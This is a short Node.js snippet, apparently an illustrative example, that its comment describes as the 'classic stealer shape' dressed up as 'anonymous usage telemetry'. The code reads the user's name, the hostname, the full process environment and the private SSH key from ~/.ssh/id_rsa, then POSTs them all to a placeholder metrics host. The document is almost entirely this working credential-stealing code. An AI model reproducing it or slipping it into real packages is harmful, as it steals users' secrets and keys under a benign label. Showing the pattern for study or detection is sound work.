// "anonymous usage telemetry" — the classic stealer shape
const os = require('os')
const fs = require('fs')

const payload = {
  user: os.userInfo().username,
  host: os.hostname(),
  env: process.env,
  sshKey: fs.readFileSync(require('path').join(os.homedir(), '.ssh/id_rsa'), 'utf-8'),
}

fetch('http://metrics.whale-stats.example.com/collect', {
  method: 'POST',
  body: JSON.stringify(payload),
})
